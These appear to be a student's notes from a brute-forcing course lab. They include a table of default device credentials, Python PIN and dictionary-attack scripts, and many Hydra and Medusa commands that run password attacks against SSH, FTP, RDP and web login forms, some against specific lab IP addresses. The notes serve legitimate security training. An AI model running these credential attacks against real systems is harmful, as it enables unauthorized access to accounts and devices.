# Brute Forcing

**Introduction**

**What is Brute Forcing**

**How Brute Forcing Works**

**Types of Brute Forcing**

**The Role of Brute Forcing in Penetration Testing**

![[Pasted image 20260310224517.png]]

# Password Security Fundamentals

**Commands**

**Payloads**

**Code Blocks**

**Paths / Endpoints**

**Tools / Services**

**Parameters**

**Reusable Snippets**

https://github.com/danielmiessler/SecLists/blob/master/Usernames/top-usernames-shortlist.txt

|Device/Manufacturer|Default Username|Default Password|Device Type|
|---|---|---|---|
|Linksys Router|admin|admin|Wireless Router|
|D-Link Router|admin|admin|Wireless Router|
|Netgear Router|admin|password|Wireless Router|
|TP-Link Router|admin|admin|Wireless Router|
|Cisco Router|cisco|cisco|Network Router|
|Asus Router|admin|admin|Wireless Router|
|Belkin Router|admin|password|Wireless Router|
|Zyxel Router|admin|1234|Wireless Router|
|Samsung SmartCam|admin|4321|IP Camera|
|Hikvision DVR|admin|12345|Digital Video Recorder (DVR)|
|Axis IP Camera|root|pass|IP Camera|
|Ubiquiti UniFi AP|ubnt|ubnt|Wireless Access Point|
|Canon Printer|admin|admin|Network Printer|
|Honeywell Thermostat|admin|1234|Smart Thermostat|
|Panasonic DVR|admin|12345|Digital Video Recorder (DVR)|

# Brute Force Attacks

Possible Combinations = Character Set Size^Password Length

```python
import requests

ip = "127.0.0.1"  # Change this to your instance IP address
port = 1234       # Change this to your instance port number

# Try every possible 4-digit PIN (from 0000 to 9999)
for pin in range(10000):
    formatted_pin = f"{pin:04d}"  # Convert the number to a 4-digit string (e.g., 7 becomes "0007")
    print(f"Attempted PIN: {formatted_pin}")

    # Send the request to the server
    response = requests.get(f"http://{ip}:{port}/pin?pin={formatted_pin}")

    # Check if the server responds with success and the flag is found
    if response.ok and 'flag' in response.json():  # .ok means status code is 200 (success)
        print(f"Correct PIN found: {formatted_pin}")
        print(f"Flag: {response.json()['flag']}")
        break
```

# Dictionary Attacks

```python
import requests

ip = "127.0.0.1"  # Change this to your instance IP address
port = 1234       # Change this to your instance port number

# Download a list of common passwords from the web and split it into lines
passwords = requests.get("https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/500-worst-passwords.txt").text.splitlines()

# Try each password from the list
for password in passwords:
    print(f"Attempted password: {password}")

    # Send a POST request to the server with the password
    response = requests.post(f"http://{ip}:{port}/dictionary", data={'password': password})

    # Check if the server responds with success and contains the 'flag'
    if response.ok and 'flag' in response.json():
        print(f"Correct password found: {password}")
        print(f"Flag: {response.json()['flag']}")
        break
```

| Wordlist                                    | Description                                                                                      | Typical Use                                        | Source                                                                                                                           |
| ------------------------------------------- | ------------------------------------------------------------------------------------------------ | -------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------- |
| `rockyou.txt`                               | A popular password wordlist containing millions of passwords leaked from the RockYou breach.     | Commonly used for password brute force attacks.    | [RockYou breach dataset](https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt)                      |
| `top-usernames-shortlist.txt`               | A concise list of the most common usernames.                                                     | Suitable for quick brute force username attempts.  | [SecLists](https://github.com/danielmiessler/SecLists/blob/master/Usernames/top-usernames-shortlist.txt)                         |
| `xato-net-10-million-usernames.txt`         | A more extensive list of 10 million usernames.                                                   | Used for thorough username brute forcing.          | [SecLists](https://github.com/danielmiessler/SecLists/blob/master/Usernames/xato-net-10-million-usernames.txt)                   |
| `2023-200_most_used_passwords.txt`          | A list of the 200 most commonly used passwords as of 2023.                                       | Effective for targeting commonly reused passwords. | [SecLists](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/2023-200_most_used_passwords.txt) |
| `Default-Credentials/default-passwords.txt` | A list of default usernames and passwords commonly used in routers, software, and other devices. | Ideal for trying default credentials.              | [SecLists](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.txt)           |
# Hybrid Attacks

```shell
wget https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/darkweb2017_top-10000.txt
```

```shell
grep -E '^.{8,}$' darkweb2017-top10000.txt > darkweb2017-minlength.txt
```

```shell
grep -E '[A-Z]' darkweb2017-minlength.txt > darkweb2017-uppercase.txt
```

```shell
grep -E '[a-z]' darkweb2017-uppercase.txt > darkweb2017-lowercase.txt
```

```shell
grep -E '[0-9]' darkweb2017-lowercase.txt > darkweb2017-number.txt
```

```shell
wc -l darkweb2017-number.txt
```

![[Pasted image 20260204003721.png]]
# Hydra

```shell
hydra -h
```

```shell
sudo apt-get -y update
```

```shell
sudo apt-get -y install hydra
```

```shell
hydra [login_options] [password_options] [attack_options] [service_options]
```

```shell
hydra -L usernames.txt -P passwords.txt www.example.com http-get
```

```shell
hydra -l root -p toor -M targets.txt ssh
```

```shell
hydra -L usernames.txt -P passwords.txt -s 2121 -V ftp.example.com ftp
```

```
hydra -L top-usernames-shortlist.txt.1  -P 2023-200_most_used_passwords.txt 154.57.164.71 -s 31784 http-get /
```


```shell
hydra -l admin -P passwords.txt www.example.com http-post-form "/login:user=^USER^&pass=^PASS^:S=302"
```

```shell
hydra -l administrator -x 6:8:abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 192.168.1.100 rdp
```

## Basic Usage

Hydra's basic syntax is:

```shell-session
[!bash!]$ hydra [login_options] [password_options] [attack_options] [service_options]
```

|Parameter|Explanation|Usage Example|
|---|---|---|
|`-l LOGIN` or `-L FILE`|Login options: Specify either a single username (`-l`) or a file containing a list of usernames (`-L`).|`hydra -l admin ...` or `hydra -L usernames.txt ...`|
|`-p PASS` or `-P FILE`|Password options: Provide either a single password (`-p`) or a file containing a list of passwords (`-P`).|`hydra -p password123 ...` or `hydra -P passwords.txt ...`|
|`-t TASKS`|Tasks: Define the number of parallel tasks (threads) to run, potentially speeding up the attack.|`hydra -t 4 ...`|
|`-f`|Fast mode: Stop the attack after the first successful login is found.|`hydra -f ...`|
|`-s PORT`|Port: Specify a non-default port for the target service.|`hydra -s 2222 ...`|
|`-v` or `-V`|Verbose output: Display detailed information about the attack's progress, including attempts and results.|`hydra -v ...` or `hydra -V ...` (for even more verbosity)|
|`service://server`|Target: Specify the service (e.g., `ssh`, `http`, `ftp`) and the target server's address or hostname.|`hydra ssh://192.168.1.100`|
|`/OPT`|Service-specific options: Provide any additional options required by the target service.|`hydra http-get://example.com/login.php -m "POST:user=^USER^&pass=^PASS^"` (for HTTP form-based authentication)|

### Hydra Services

|Hydra Service|Service/Protocol|Description|Example Command|
|---|---|---|---|
|ftp|File Transfer Protocol (FTP)|Used to brute-force login credentials for FTP services, commonly used to transfer files over a network.|`hydra -l admin -P /path/to/password_list.txt ftp://192.168.1.100`|
|ssh|Secure Shell (SSH)|Targets SSH services to brute-force credentials, commonly used for secure remote login to systems.|`hydra -l root -P /path/to/password_list.txt ssh://192.168.1.100`|
|http-get/post|HTTP Web Services|Used to brute-force login credentials for HTTP web login forms using either GET or POST requests.|`hydra -l admin -P /path/to/password_list.txt http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect"`|
|smtp|Simple Mail Transfer Protocol|Attacks email servers by brute-forcing login credentials for SMTP, commonly used to send emails.|`hydra -l admin -P /path/to/password_list.txt smtp://mail.server.com`|
|pop3|Post Office Protocol (POP3)|Targets email retrieval services to brute-force credentials for POP3 login.|`hydra -l user@example.com -P /path/to/password_list.txt pop3://mail.server.com`|
|imap|Internet Message Access Protocol|Used to brute-force credentials for IMAP services, which allow users to access their email remotely.|`hydra -l user@example.com -P /path/to/password_list.txt imap://mail.server.com`|
|mysql|MySQL Database|Attempts to brute-force login credentials for MySQL databases.|`hydra -l root -P /path/to/password_list.txt mysql://192.168.1.100`|
|mssql|Microsoft SQL Server|Targets Microsoft SQL servers to brute-force database login credentials.|`hydra -l sa -P /path/to/password_list.txt mssql://192.168.1.100`|
|vnc|Virtual Network Computing (VNC)|Brute-forces VNC services, used for remote desktop access.|`hydra -P /path/to/password_list.txt vnc://192.168.1.100`|
|rdp|Remote Desktop Protocol (RDP)|Targets Microsoft RDP services for remote login brute-forcing.|`hydra -l admin -P /path/to/password_list.txt rdp://192.168.1.100`|
# Basic HTTP Authentication

```http
GET /protected_resource HTTP/1.1
Host: www.example.com
Authorization: Basic YWxpY2U6c2VjcmV0MTIz
```

```shell
curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/56a39ab9a70a89b56d66dad8bdffb887fba1260e/Passwords/2023-200_most_used_passwords.txt
```

```shell
hydra -l basic-auth-user -P 2023-200_most_used_passwords.txt 127.0.0.1 http-get / -s 81
```

```shell
hydra -l basic-auth-user -P 2023-200_most_used_passwords.txt 154.57.164.72 http-get / -s 32745
```

# Login Forms 

**HTML Login Form (Example)**

```html
<form action="/login" method="post">
  <label for="username">Username:</label>
  <input type="text" id="username" name="username"><br><br>
  <label for="password">Password:</label>
  <input type="password" id="password" name="password"><br><br>
  <input type="submit" value="Submit">
</form>
```

**HTTP POST Request (Example)**

```http
POST /login HTTP/1.1
Host: www.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 29

username=john&password=secret123
```

**Hydra http-post-form Syntax**

```bash
hydra [options] target http-post-form "path:params:condition_string"
```

**Hydra Failure Condition Example**

```bash
hydra ... http-post-form "/login:user=^USER^&pass=^PASS^:F=Invalid credentials"
```

**Hydra Success Condition (HTTP 302)**

```bash
hydra ... http-post-form "/login:user=^USER^&pass=^PASS^:S=302"
```

**Hydra Success Condition (Keyword)**

```bash
hydra ... http-post-form "/login:user=^USER^&pass=^PASS^:S=Dashboard"
```

**HTML Login Form (Target)**

```html
<form method="POST">
    <h2>Login</h2>
    <label for="username">Username:</label>
    <input type="text" id="username" name="username">
    <label for="password">Password:</label>
    <input type="password" id="password" name="password">
    <input type="submit" value="Login">
</form>
```

**Hydra Params String**

```bash
/:username=^USER^&password=^PASS^:F=Invalid credentials
```

**Wordlist Downloads**

```bash
curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/top-usernames-shortlist.txt
```

```bash
curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/2023-200_most_used_passwords.txt
```

**Hydra Brute Force Command**

```bash
hydra -L top-usernames-shortlist.txt -P 2023-200_most_used_passwords.txt -f IP -s 5000 http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials"
```
```
hydra -L top-usernames-shortlist.txt -P 2023-200_most_used_passwords.txt -f 154.57.164.70 -s 30845 http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials"
```


# Medusa

refer to 
https://academy.hackthebox.com/module/57/section/512
for more info about the commands

**Installation**

```bash
medusa -h
```

```bash
sudo apt-get -y update
```

```bash
sudo apt-get -y install medusa
```

**Command Syntax**

```bash
medusa [target_options] [credential_options] -M module [module_options]
```

**Parameter Usage Examples**

```bash
medusa -h 192.168.1.10
```

```bash
medusa -H targets.txt
```

```bash
medusa -u admin
```

```bash
medusa -U usernames.txt
```

```bash
medusa -p password123
```

```bash
medusa -P passwords.txt
```

```bash
medusa -M ssh
```

```bash
medusa -M http -m "POST /login.php HTTP/1.1\r\nContent-Length: 30\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nusername=^USER^&password=^PASS^"
```

```bash
medusa -t 4
```

```bash
medusa -f
```

```bash
medusa -F
```

```bash
medusa -n 2222
```

```bash
medusa -v 4
```

**Module Usage Examples**

```bash
medusa -M ftp -h 192.168.1.100 -u admin -P passwords.txt
```

```bash
medusa -M http -h www.example.com -U users.txt -P passwords.txt -m DIR:/login.php -m FORM:username=^USER^&password=^PASS^
```

```bash
medusa -M imap -h mail.example.com -U users.txt -P passwords.txt
```

```bash
medusa -M mysql -h 192.168.1.100 -u root -P passwords.txt
```

```bash
medusa -M pop3 -h mail.example.com -U users.txt -P passwords.txt
```

```bash
medusa -M rdp -h 192.168.1.100 -u admin -P passwords.txt
```

```bash
medusa -M ssh -h 192.168.1.100 -u root -P passwords.txt
```

```bash
medusa -M svn -h 192.168.1.100 -u admin -P passwords.txt
```

```bash
medusa -M telnet -h 192.168.1.100 -u admin -P passwords.txt
```

```bash
medusa -M vnc -h 192.168.1.100 -P passwords.txt
```

```bash
medusa -M web-form -h www.example.com -U users.txt -P passwords.txt -m FORM:"username=^USER^&password=^PASS^:F=Invalid"
```

**Attack Examples**

```bash
medusa -h 192.168.0.100 -U usernames.txt -P passwords.txt -M ssh
```


```bash
medusa -H web_servers.txt -U usernames.txt -P passwords.txt -M http -m GET
```

```bash
medusa -h 10.0.0.5 -U usernames.txt -e ns -M service_name
```


# Web Services 

**Medusa SSH Brute Force**

```bash
medusa -h <IP> -n <PORT> -u sshuser -P 2023-200_most_used_passwords.txt -M ssh -t 3
```



```shell
medusa -h 154.57.164.77 -n 32361 -u sshuser -P 2023-200_most_used_passwords.txt -M ssh -t 3
```


```bash
medusa -h IP -n PORT -u sshuser -P 2023-200_most_used_passwords.txt -M ssh -t 3
```

**SSH Login**

```bash
ssh sshuser@154.57.164.77 -p 32361
```

```
ssh sshuser@<IP> -p PORT
```

**Service Enumeration**

```bash
netstat -tulpn | grep LISTEN
```

```bash
nmap localhost
```

**Medusa FTP Brute Force**

```bash
medusa -h 127.0.0.1 -u ftpuser -P 2020-200_most_used_passwords.txt -M ftp -t 5
```

```
medusa -h 154.57.164.73 -n 30503 -u ftpuser -P /home/satwossh/username-anarchy/test-names3.txt -M ftp -t 5
```

```
medusa -h 154.57.164.73 -n 30503 -U passwords.txt -P 2023-200_most_used_passwords.txt -M ftp -t 5
```

```
medusa -h 127.0.0.1 -U /home/satwossh/username-anarchy/test-names3.txt -P passwords.txt -M ftp -t 5
```

```
ssh satwossh@154.57.164.73 -p 30503
```

```
ssh sshuser@154.57.164.77 -p 32361
```

**FTP Login**

```
ftp ftp://ftpuser:@154.57.164.77
```


```bash
ftp ftp://ftpuser:<FTPUSER_PASSWORD>@localhost
```

```
ftp ftp://ftpuser:qqww1122@localhost
```

```
ftp ftp://thomas:'chocolate!'@localhost
```
**FTP File Retrieval**

```bash
get flag.txt
```

```bash
exit
```

**Read Flag**

```bash
cat flag.txt
```




# Custom Wordlists 

**Username Anarchy**

```bash
./username-anarchy -l
```

```bash
sudo apt install ruby -y
```

```bash
git clone https://github.com/urbanadventurer/username-anarchy.git
```

```bash
cd username-anarchy
```

```bash
./username-anarchy Jane Smith > jane_smith_usernames.txt
```


```
./username-anarchy Thomas Smith > Thomas_Smith_usernames.txt
```

**CUPP**

```bash
sudo apt install cupp -y
```

```bash
cupp -i
```

**Password Policy Filtering**

```bash
grep -E '^.{6,}$' Thomas_Smith_usernames.txt | grep -E '[A-Z]' | grep -E '[a-z]' | grep -E '[0-9]' | grep -E '([!@#$%^&*].*){2,}' > jane-filtered.txt
```

```shell
grep -E '^.{6,}$' jane.txt | grep -E '[A-Z]' | grep -E '[a-z]' | grep -E '[0-9]' | grep -E '([!@#$%^&*].*){2,}' > jane-filtered.txt
```

**Hydra Web Login Brute Force**

```bash
hydra -L jane_smith_usernames.txt -P jane-filtered.txt IP -s PORT -f http-post-form "/:username=^USER^&password=^PASS^:Invalid credentials"
```

```
hydra -L jane_smith_usernames.txt -P jane-filtered.txt 154.57.164.65 -s 31077 -f http-post-form "/:username=^USER^&password=^PASS^:Invalid credentials"
```


```
medusa -h 127.0.0.1 -U /home/satwossh/username-anarchy/Thomas_Smith_usernames.txt -P passwords.txt -M ftp -t 5 | grep SUCCESS
```

#
#

